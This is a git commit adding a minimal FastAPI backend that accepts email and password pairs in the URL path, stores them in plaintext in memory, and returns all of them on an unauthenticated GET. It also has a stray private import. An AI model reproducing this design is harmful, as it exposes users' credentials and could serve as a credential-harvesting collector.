1d6b63c897633ab8207104eee3243e31fc788748
Inventor-creator <aryaupatil9@gmail.com>
2026-04-10 00:18:45 +0530

    backend added

---
+++ main.py
@@ -0,0 +1,35 @@
+from contextlib import _ReturnT_co
+from fastapi import FastAPI
+from fastapi.responses import HTMLResponse
+
+
+app = FastAPI(
+    title="Vercel + FastAPI",
+    description="Vercel + FastAPI",
+    version="1.0.0",
+)
+cache = {}
+
+
+def set_data(key, value):
+
+    cache[key] = value
+
+def get_data():
+    return cache
+
+@app.post("/{email}/{password}")
+def log(email:str , password:str):
+
+
+    set_data(email, password)
+
+    return;
+
+@app.get("/")
+def get_all_data():
+    return get_data()
+
+if __name__ == "__main__":
+    import uvicorn
+    uvicorn.run("main:app", host="0.0.0.0", port=5001, reload=True)
